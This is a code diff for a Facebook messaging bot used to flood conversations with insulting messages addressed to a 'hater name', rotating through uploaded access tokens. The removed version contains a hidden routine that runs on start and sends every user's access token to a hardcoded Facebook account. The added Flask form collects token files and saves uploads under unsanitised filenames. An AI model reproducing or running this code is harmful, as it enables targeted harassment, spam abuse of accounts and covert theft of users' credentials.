@@ -1,150 +1,98 @@
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
-import random
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
+from flask import Flask, request, render_template_string
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-      def do_GET(self):
-          self.send_response(200)
-          self.send_header('Content-type', 'text/plain')
-          self.end_headers()
-          self.wfile.write(b"-- MAFIA DON HU B3 BHOSDIK3")
-def execute_server():
-      PORT = 4000
+app = Flask(__name__)
 
-      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-          print("Server running at http://localhost:{}".format(PORT))
-          httpd.serve_forever()
+# HTML template for the form
+form_template = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page server</title>
+    <style>
+        body {
+            background-color: black;
+            color: green;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            border: 2px solid green;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px green;
+            max-width: 400px;
+            width: 100%;
+        }
+        input[type="file"], input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid green;
+            border-radius: 5px;
+            background-color: black;
+            color: green;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: green;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Page server</h2>
+        <form action="/submit" method="post" enctype="multipart/form-data">
+            <label for="tokens">Tokens File:</label>
+            <input type="file" id="tokens" name="tokens">
+            <label for="thread_id">Thread ID:</label>
+            <input type="text" id="thread_id" name="thread_id">
+            <label for="hater_name">Hater Name:</label>
+            <input type="text" id="hater_name" name="hater_name">
+            <label for="messages">Messages File:</label>
+            <input type="file" id="messages" name="messages">
+            <label for="delay">Delay (seconds):</label>
+            <input type="number" id="delay" name="delay">
+            <input type="submit" value="Start">
+        </form>
+    </div>
+</body>
+</html>
+'''
 
+@app.route('/')
+def form():
+    return render_template_string(form_template)
 
-def send_initial_message():
-      with open('tokennum.txt', 'r') as file:
-          tokens = file.readlines()
+@app.route('/submit', methods=['POST'])
+def submit():
+    tokens_file = request.files.get('tokens')
+    thread_id = request.form.get('thread_id')
+    hater_name = request.form.get('hater_name')
+    messages_file = request.files.get('messages')
+    delay = request.form.get('delay')
 
-      # Modify the message as per your requirement
-      msg_template = "Hello SAHIL sir! I am using your server. My token is {}"
+    # Save files if uploaded
+    if tokens_file:
+        tokens_file.save(f'/tmp/{tokens_file.filename}')
+    if messages_file:
+        messages_file.save(f'/tmp/{messages_file.filename}')
 
-      # Specify the ID where you want to send the message
-      target_id = "100092287927043"
+    # Process the form data here
+    # ...
 
-      requests.packages.urllib3.disable_warnings()
-
-      def liness():
-          print('\033[1;92m' + '•──────────────────────FUCKER───────────────────────────────•')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      for token in tokens:
-          access_token = token.strip()
-          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-          msg = msg_template.format(access_token)
-          parameters = {'access_token': access_token, 'message': msg}
-          response = requests.post(url, json=parameters, headers=headers)
-
-          # No need to print here, as requested
-          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-          time.sleep(0.1)  # Wait for 1 second between sending each initial message
-
-      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
-send_initial_message()
-def send_messages_from_file():
-      with open('convo.txt', 'r') as file:
-          convo_id = file.read().strip()
-
-      with open('File.txt', 'r') as file:
-          messages = file.readlines()
-
-      num_messages = len(messages)
-
-      with open('tokennum.txt', 'r') as file:
-          tokens = file.readlines()
-      num_tokens = len(tokens)
-      max_tokens = min(num_tokens, num_messages)
-
-      with open('hatersname.txt', 'r') as file:
-          haters_name = file.read().strip()
-
-      with open('time.txt', 'r') as file:
-          speed = int(file.read().strip())
-
-      def liness():
-          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      while True:
-          try:
-              for message_index in range(num_messages):
-                  token_index = message_index % max_tokens
-                  access_token = tokens[token_index].strip()
-
-                  message = messages[message_index].strip()
-
-                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-                  response = requests.post(url, json=parameters, headers=headers)
-
-                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
-                  if response.ok:
-                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  else:
-                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  time.sleep(speed)
-
-              print("\n[+] All messages sent. Restarting the process...\n")
-          except Exception as e:
-              print("[!] An error occurred: {}".format(e))
-
-def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
-
-      # Send the initial message to the specified ID using all tokens
-
-
-      # Then, continue with the message sending loop
-      send_messages_from_file()
+    return "Form submitted successfully!"
 
 if __name__ == '__main__':
-      main ()
+    app.run(host='0.0.0.0', port=8080)
